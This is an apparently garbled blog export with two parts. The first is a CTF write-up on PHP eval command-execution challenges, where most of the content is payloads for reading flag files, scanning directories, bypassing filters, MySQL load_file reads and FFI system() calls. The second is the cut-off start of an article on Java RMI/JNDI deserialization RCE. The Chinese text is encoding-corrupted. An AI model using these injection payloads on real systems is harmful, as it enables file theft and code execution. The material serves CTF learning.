<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//payloadæ±‡æ€»</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">print_r</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>åŒæ—¶è®°å½•ä¸€ä¸ª,ä½†æ˜¯è¿™é“é¢˜ä¸èƒ½ç”¨<code>$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetss($a);echo $line;&#125; //php7.3ç‰ˆæœ¬å è¯¥å‡½æ•°å·²ä¸å†è¢«ä½¿ç”¨</code>è¿˜æœ‰æ–°å§¿åŠ¿</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//é€šè¿‡å¤åˆ¶ï¼Œé‡å‘½åè¯»å–phpæ–‡ä»¶å†…å®¹ï¼ˆå‡½æ•°æ‰§è¡Œåï¼Œè®¿é—®url/flag.txtï¼‰</span></span><br><span class="line"><span class="title function_ invoke__">copy</span>()</span><br><span class="line"><span class="title function_ invoke__">rename</span>()</span><br><span class="line"><span class="comment">//ç”¨æ³•ï¼š</span></span><br><span class="line"><span class="title function_ invoke__">copy</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);             <span class="comment">//è¿‡60</span></span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);           <span class="comment">//è¿‡60</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web61-65"><a href="#web61-65" class="headerlink" title="web61-65"></a>web61-65</h1><p>ä¸ºäº†ç†Ÿæ‚‰å­¦ä¹ æ–°å§¿åŠ¿<code>c=$a=opendir(&#39;./&#39;);while(($file = readdir($a)) !=false)&#123;echo $file.&quot; &quot;;&#125;</code>æˆ–è€…<code>c=print_r(scandir(current(localeconv())));</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//payload:</span></span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h1><p>æ‰«æç›®å½•<code>c=var_dump(scandir(&quot;/&quot;));</code>,å‘ç°æ˜¯<code>flag.txt</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ä¸‹é¢æ˜¯payload</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h1><p>å¿«ä¹ç¬¬ä¸€æ­¥æ‰«æç›®å½•<code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//payloadä»‹ç»</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h1><p>ä»£ç å®¡è®¡,è¿™é‡Œå…ˆä»‹ç»å‡ ä¸ªå‡½æ•°<br>ob_get_contents â€” è¿”å›è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹<br>ob_end_clean â€” æ¸…ç©ºï¼ˆæ“¦é™¤ï¼‰ç¼“å†²åŒºå¹¶å…³é—­è¾“å‡ºç¼“å†²</p>
<p>ç„¶åçœ‹è¿™é‡Œæœ‰ä¸€å¥å®˜æ–¹çš„ä»‹ç»</p>
<blockquote>
<p>æ­¤å‡½æ•°ä¸¢å¼ƒæœ€é¡¶å±‚è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹å¹¶å…³é—­è¿™ä¸ªç¼“å†²åŒºã€‚å¦‚æœæƒ³è¦è¿›ä¸€æ­¥å¤„ç†ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¿…é¡»åœ¨ob_end_clean()ä¹‹å‰è°ƒç”¨ob_get_contents()ï¼Œå› ä¸ºå½“è°ƒç”¨ob_end_clean()æ—¶ç¼“å†²åŒºå†…å®¹å°†è¢«ä¸¢å¼ƒã€‚</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//åœ¨ç½‘é¡µä¸­ä¼šè¾“å‡ºå†…å®¹</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="comment">//åœ¨è¿™é‡Œåˆ™åœ¨ç½‘é¡µå½“ä¸­æ²¡æœ‰è¾“å‡ºå†…å®¹ï¼Œä¸éš¾çœ‹å‡ºå…¶å–å¾—äº†ç¼“å†²åŒºçš„å†…å®¹å¹¶æ¸…ç©ºäº†ç¼“å†²åŒº</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>æ‰€ä»¥ä¸éš¾æƒ³å‡ºpayload<code>c=require_once(&#39;/flag.txt&#39;);exit();</code>è¿™é‡Œé€šè¿‡<code>exit();</code>ä½¿ç¨‹åºæå‰é€€å‡ºï¼Œç»•è¿‡åé¢çš„æ­£åˆ™è¡¨è¾¾å¼</p>
<h1 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;?&gt;&lt;?php echo 111;?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>è¿™é‡Œçš„?&gt;æ˜¯ä¸ºäº†é—­åˆå‰é¢&lt;?php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload:https:<span class="comment">//github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</span></span><br><span class="line">éœ€è¦æŠŠé‡Œé¢çš„payloadè¿›è¡Œurlç¼–ç </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h1><p>ç¬¬ä¸€æ­¥æ‰«æç›®å½•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">payload:</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h1><p>ç¬¬ä¸€æ­¥æ‰«æç›®å½•</p>
<p><code>c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);</code></p>
<p>åˆ©ç”¨mysql load_fileè¯»æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title class_">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><p>ç¬¬ä¸€éæ‰«æç›®å½•<br>c&#x3D;$a&#x3D;new DirectoryIterator(â€œglob:&#x2F;&#x2F;&#x2F;*â€);foreach($a as $f){echo($f-&gt;__toString().â€™ â€˜);}exit(0);ç„¶åå‘ç°ä¸‹é¢æœ‰ä¸€ä¸ªreadflagè‚¯å®šæ˜¯è¦è°ƒç”¨è¿™ä¸ª,ä¸ä¼šåšï¼Œçœ‹äº†è¿™ä¸ªFFIæ‹“å±•æŒºç¥å¥‡çš„ï¼Œè¯´è°php7.4ç‰ˆæœ¬ä»¥ä¸Šæ‰æœ‰ï¼Œå¤§å®¶æƒ³äº†è§£å¯ä»¥çœ‹çœ‹ä¸‹é¢çš„å‚è€ƒé“¾æ¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span>=<span class="title class_">FFI</span>::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(char *command);&quot;</span>, <span class="string">&quot;libc.so.6&quot;</span>);<span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="keyword">exit</span>();  </span><br><span class="line"></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>åŸºäºJavaååºåˆ—åŒ–RCE - ææ‡‚RMIã€JRMPã€JNDI</title>
    <url>/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%AE%A4%E7%9F%A5/%E5%9F%BA%E4%BA%8EJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%20-%20%E6%90%9E%E6%87%82RM/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åŸºç¡€çŸ¥è¯†è®²è§£ã€‚</p>
<span id="more"></span>

<h1 id="1-ææ‡‚æ¦‚å¿µ"><a href="#1-ææ‡‚æ¦‚å¿µ" class="headerlink" title="1 ææ‡‚æ¦‚å¿µ"></a>1 ææ‡‚æ¦‚å¿µ</h1><h2 id="1-1-RMI"><a href="#1-1-RMI" class="headerlink" title="1.1 RMI"></a>1.1 RMI</h2><p>ä»¥ä¸‹æ˜¯wikiçš„æè¿°ï¼š</p>
<p>Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œå³Java RMIï¼ˆ<code>Java Remote Method Invocation</code>ï¼‰æ˜¯Javaç¼–ç¨‹è¯­è¨€é‡Œï¼Œä¸€ç§ç”¨äºå®ç°è¿œç¨‹è¿‡ç¨‹è°ƒç”¨çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ã€‚å®ƒä½¿å®¢æˆ·æœºä¸Šè¿è¡Œçš„ç¨‹åºå¯ä»¥è°ƒç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ã€‚è¿œç¨‹æ–¹æ³•è°ƒç”¨ç‰¹æ€§ä½¿Javaç¼–ç¨‹äººå‘˜èƒ½å¤Ÿåœ¨ç½‘ç»œç¯å¢ƒä¸­åˆ†å¸ƒæ“ä½œã€‚RMIå…¨éƒ¨çš„å®—æ—¨å°±æ˜¯å°½å¯èƒ½ç®€åŒ–è¿œç¨‹æ¥å£å¯¹è±¡çš„ä½¿ç”¨ã€‚  </p>
<p>Java RMIæå¤§åœ°ä¾èµ–äºæ¥å£ã€‚åœ¨éœ€è¦åˆ›å»ºä¸€ä¸ªè¿œç¨‹å¯¹è±¡çš„æ—¶å€™ï¼Œ<strong>ç¨‹åºå‘˜é€šè¿‡ä¼ é€’ä¸€ä¸ªæ¥å£æ¥éšè—åº•å±‚çš„å®ç°ç»†èŠ‚</strong>ã€‚å®¢æˆ·ç«¯å¾—åˆ°çš„è¿œç¨‹å¯¹è±¡å¥æŸ„æ­£å¥½ä¸æœ¬åœ°çš„æ ¹ä»£ç è¿æ¥ï¼Œç”±åè€…è´Ÿè´£é€è¿‡ç½‘ç»œé€šä¿¡ã€‚è¿™æ ·ä¸€æ¥ï¼Œç¨‹åºå‘˜åªéœ€å…³å¿ƒå¦‚ä½•é€šè¿‡è‡ªå·±çš„æ¥å£å¥æŸ„å‘é€æ¶ˆæ¯ã€‚</p>
<p>æ ¹æ®wikiæ‰€è¯´RMIå…¨ç§°ä¸º<code>Remote Method Invocation</code>ï¼Œä¹Ÿå°±æ˜¯<strong>è¿œç¨‹æ–¹æ³•è°ƒç”¨</strong>ï¼Œé€šä¿—ç‚¹è§£é‡Šï¼Œå°±æ˜¯è·¨è¶Šjvmï¼Œè°ƒç”¨ä¸€ä¸ªè¿œç¨‹æ–¹æ³•ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œä¸€èˆ¬æƒ…å†µä¸‹javaæ–¹æ³•è°ƒç”¨ï¼ŒæŒ‡çš„æ˜¯åŒä¸€ä¸ªjvmå†…æ–¹æ³•çš„è°ƒç”¨ï¼Œè€ŒRMIä¸ä¹‹æ°æ°ç›¸åã€‚</p>
<p>ä¾‹å¦‚æˆ‘ä»¬ä½¿ç”¨æµè§ˆå™¨å¯¹ä¸€ä¸ªhttpåè®®å®ç°çš„æ¥å£è¿›è¡Œè°ƒç”¨ï¼Œè¿™ä¸ªæ¥å£è°ƒç”¨è¿‡ç¨‹æˆ‘ä»¬å¯ä»¥ç§°ä¹‹ä¸º<code>Interface Invocation</code>ï¼Œè€ŒRMIçš„æ¦‚å¿µä¸ä¹‹éå¸¸ç›¸ä¼¼ï¼Œåªä¸è¿‡RMIè°ƒç”¨çš„æ˜¯ä¸€ä¸ªJavaæ–¹æ³•ï¼Œè€Œæµè§ˆå™¨è°ƒç”¨çš„æ˜¯ä¸€ä¸ªhttpæ¥å£ã€‚å¹¶ä¸”Javaä¸­å°è£…äº†RMIçš„ä¸€ç³»åˆ—å®šä¹‰ã€‚</p>
<p>åˆ°è¿™é‡Œäº†ï¼Œæˆ‘è¿™è¾¹åšä¸ªç®€çŸ­é€šä¿—çš„æ€»ç»“ï¼šRMIæ˜¯ä¸€ç§è¡Œä¸ºï¼Œè¿™ç§è¡Œä¸ºæŒ‡çš„æ˜¯Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚</p>
<h2 id="1-2-JRMP"><a href="#1-2-JRMP" class="headerlink" title="1.2 JRMP"></a>1.2 JRMP</h2><p>ä»¥ä¸‹æ˜¯wikiçš„æè¿°ï¼š</p>
<p>Javaè¿œç¨‹æ–¹æ³•åè®®ï¼ˆè‹±è¯­ï¼š<code>Java Remote Method Protocolï¼ŒJRMP</code>ï¼‰æ˜¯ç‰¹å®šäºJavaæŠ€æœ¯çš„ã€ç”¨äºæŸ¥æ‰¾å’Œå¼•ç”¨è¿œç¨‹å¯¹è±¡çš„åè®®ã€‚è¿™æ˜¯è¿è¡Œåœ¨Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRMIï¼‰ä¹‹ä¸‹ã€TCP&#x2F;IPä¹‹ä¸Šçš„çº¿è·¯å±‚åè®®ï¼ˆè‹±è¯­ï¼š<code>Wire protocol</code>ï¼‰ã€‚</p>
<p>æ ¹æ®wikiæ‰€è¯´JRMPå…¨ç§°ä¸º<code>Java Remote Method Protocol</code>ï¼Œ<strong>ä¹Ÿå°±æ˜¯Javaè¿œç¨‹æ–¹æ³•åè®®</strong>ï¼Œé€šä¿—ç‚¹è§£é‡Šï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªåè®®ï¼Œä¸€ä¸ªåœ¨TCP&#x2F;IPä¹‹ä¸Šçš„<strong>çº¿è·¯å±‚åè®®</strong>ï¼Œ<strong>ä¸€ä¸ªRMIçš„è¿‡ç¨‹ï¼Œæ˜¯ç”¨åˆ°JRMPè¿™ä¸ªåè®®å»ç»„ç»‡æ•°æ®æ ¼å¼ç„¶åé€šè¿‡TCPè¿›è¡Œä¼ è¾“ï¼Œä»è€Œè¾¾åˆ°RMIï¼Œä¹Ÿå°±æ˜¯è¿œç¨‹æ–¹æ³•è°ƒç”¨</strong>ã€‚</p>
<p>è¿˜æ˜¯å‰é¢æ‰€è¯´çš„ä¾‹å­ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨æµè§ˆå™¨è¿›è¡Œè®¿é—®ä¸€ä¸ªç½‘ç»œä¸Šçš„æ¥å£æ—¶ï¼Œå®ƒå’ŒæœåŠ¡å™¨ä¹‹é—´çš„æ•°æ®ä¼ è¾“ä»¥åŠæ•°æ®æ ¼å¼çš„ç»„ç»‡ï¼Œæ˜¯ç”¨åˆ°<code>åŸºäºTCP/IPä¹‹ä¸Šçš„HTTPåè®®</code>ï¼Œåªæœ‰é€šè¿‡è¿™ä¸ªHTTPåè®®ï¼Œæµè§ˆå™¨å’ŒæœåŠ¡ç«¯çº¦å®šå¥½çš„ä¸€ä¸ªåè®®ï¼Œå®ƒä»¬ä¹‹é—´æ‰èƒ½æ­£å¸¸çš„äº¤æµé€šè®¯ã€‚è€ŒJRMPä¹Ÿæ˜¯ä¸€ä¸ªä¸ä¹‹ç›¸ä¼¼çš„åè®®ï¼Œåªä¸è¿‡JRMPè¿™ä¸ªåè®®ä»…ç”¨äºJava RMIä¸­ã€‚</p>
<p>æ€»ç»“çš„æ¥è¯´ï¼šJRMPæ˜¯ä¸€ä¸ªåè®®ï¼Œæ˜¯ç”¨äºJava RMIè¿‡ç¨‹ä¸­çš„åè®®ï¼Œåªæœ‰ä½¿ç”¨è¿™ä¸ªåè®®ï¼Œæ–¹æ³•è°ƒç”¨åŒæ–¹æ‰èƒ½æ­£å¸¸çš„è¿›è¡Œæ•°æ®äº¤æµã€‚</p>
<h2 id="1-3-JNDI"><a href="#1-3-JNDI" class="headerlink" title="1.3 JNDI"></a>1.3 JNDI</h2><p>ä»¥ä¸‹æ˜¯wikiçš„æè¿°ï¼š</p>
<p>Javaå‘½åå’Œç›®å½•æ¥å£ï¼ˆ<code>Java Naming and Directory Interface</code>ï¼Œç¼©å†™JNDIï¼‰ï¼Œ<strong>æ˜¯Javaçš„ä¸€ä¸ªç›®å½•æœåŠ¡åº”ç”¨ç¨‹åºæ¥å£ï¼ˆAPIï¼‰</strong>ï¼Œå®ƒæä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»è€Œä½¿å¾—å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ã€‚</p>
<p>æ ¹æ®wikiçš„æè¿°ï¼ŒJNDIå…¨ç§°ä¸º<code>Java Naming and Directory Interface</code>ï¼Œ<strong>ä¹Ÿå°±æ˜¯Javaå‘½åå’Œç›®å½•æ¥å£</strong>ã€‚æ—¢ç„¶æ˜¯æ¥å£ï¼Œé‚£ä¹ˆå°±å¿…å®šæœ‰å…¶å®ç°ï¼Œè€Œç›®å‰æˆ‘ä»¬Javaä¸­ä½¿ç”¨æœ€å¤šçš„åŸºæœ¬å°±æ˜¯rmiå’Œldapçš„ç›®å½•æœåŠ¡ç³»ç»Ÿã€‚è€Œå‘½åçš„æ„æ€å°±æ˜¯ï¼Œåœ¨ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå®ƒå®ç°äº†æŠŠä¸€ä¸ªæœåŠ¡åç§°å’Œå¯¹è±¡æˆ–å‘½åå¼•ç”¨ç›¸å…³è”ï¼Œåœ¨å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨ç›®å½•ç³»ç»ŸæœåŠ¡ï¼Œå¹¶æ ¹æ®æœåŠ¡åç§°æŸ¥è¯¢åˆ°ç›¸å…³è”çš„å¯¹è±¡æˆ–å‘½åå¼•ç”¨ï¼Œç„¶åè¿”å›ç»™å®¢æˆ·ç«¯ã€‚è€Œç›®å½•çš„æ„æ€å°±æ˜¯åœ¨å‘½åçš„åŸºç¡€ä¸Šï¼Œå¢åŠ äº†å±æ€§çš„æ¦‚å¿µï¼Œæˆ‘ä»¬å¯ä»¥æƒ³è±¡ä¸€ä¸ªæ–‡ä»¶ç›®å½•ä¸­ï¼Œæ¯ä¸ªæ–‡ä»¶å’Œç›®å½•éƒ½ä¼šå­˜åœ¨ç€ä¸€äº›å±æ€§ï¼Œæ¯”å¦‚åˆ›å»ºæ—¶é—´ã€è¯»å†™æ‰§è¡Œæƒé™ç­‰ç­‰ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™äº›ç›¸å…³å±æ€§ç­›é€‰å‡ºç›¸åº”çš„æ–‡ä»¶å’Œç›®å½•ã€‚è€ŒJNDIä¸­çš„ç›®å½•æœåŠ¡ä¸­çš„å±æ€§å¤§æ¦‚ä¹Ÿä¸ä¹‹ç›¸ä¼¼ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨ä½¿ç”¨æœåŠ¡åç§°ä»¥å¤–ï¼Œé€šè¿‡ä¸€äº›å…³è”å±æ€§æŸ¥æ‰¾åˆ°å¯¹åº”çš„å¯¹è±¡ã€‚</p>
<p>æ€»ç»“çš„æ¥è¯´ï¼šJNDIæ˜¯ä¸€ä¸ªæ¥å£ï¼Œåœ¨è¿™ä¸ªæ¥å£ä¸‹ä¼šæœ‰å¤šç§ç›®å½•ç³»ç»ŸæœåŠ¡çš„å®ç°ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡åç§°ç­‰å»æ‰¾åˆ°ç›¸å…³çš„å¯¹è±¡ï¼Œå¹¶æŠŠå®ƒä¸‹è½½åˆ°å®¢æˆ·ç«¯ä¸­æ¥ã€‚</p>
<h1 id="2-ä»¥æ”»å‡»ä¾‹å­æ¥é˜è¿°"><a href="#2-ä»¥æ”»å‡»ä¾‹å­æ¥é˜è¿°" class="headerlink" title="2 ä»¥æ”»å‡»ä¾‹å­æ¥é˜è¿°"></a>2 ä»¥æ”»å‡»ä¾‹å­æ¥é˜è¿°</h1><p>å‰è¨€å·²ç»è¯´äº†â€œå»é˜è¿°RMIã€JNDIã€JRMPâ€¦ï¼Œå¹¶è®²è®²ä¸ºä»€ä¹ˆç”¨<code>InitialContext lookup</code>ä¸€ä¸ªJNDIçš„rmiã€ldapæœåŠ¡ä¼šå¯¼è‡´è‡ªèº«è¢«ååºåˆ—åŒ–RCEï¼Œä¸ºä»€ä¹ˆRegistry bindæš´éœ²ä¸€ä¸ªæœåŠ¡å¯¹è±¡åˆ°RmiRegistryä¼šå¯¼è‡´RegistryæœåŠ¡è‡ªèº«è¢«ååºåˆ—åŒ–RCEï¼Œä¸ºä»€ä¹ˆä½¿ç”¨JRMPèƒ½äº’ç›¸å¯¹æ‰“ç­‰ç­‰â€</p>
<h2 id="2-1-ä¸ºä»€ä¹ˆç”¨InitialContext-lookupä¸€ä¸ªJNDIçš„rmiã€ldapæœåŠ¡ä¼šå¯¼è‡´è‡ªèº«è¢«ååºåˆ—åŒ–RCE"><a href="#2-1-ä¸ºä»€ä¹ˆç”¨InitialContext-lookupä¸€ä¸ªJNDIçš„rmiã€ldapæœåŠ¡ä¼šå¯¼è‡´è‡ªèº«è¢«ååºåˆ—åŒ–RCE" class="headerlink" title="2.1 ä¸ºä»€ä¹ˆç”¨InitialContext lookupä¸€ä¸ªJNDIçš„rmiã€ldapæœåŠ¡ä¼šå¯¼è‡´è‡ªèº«è¢«ååºåˆ—åŒ–RCE"></a>2.1 ä¸ºä»€ä¹ˆç”¨InitialContext lookupä¸€ä¸ªJNDIçš„rmiã€ldapæœåŠ¡ä¼šå¯¼è‡´è‡ªèº«è¢«ååºåˆ—åŒ–RCE</h2><p>æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸ªä¾‹å­ï¼š</p>
<p>å…·æœ‰æ¥å£ç±»HelloServiceå’Œå®ç°ç±»HelloServiceImpl</p>
<p>ç¨‹åºAï¼š</p>
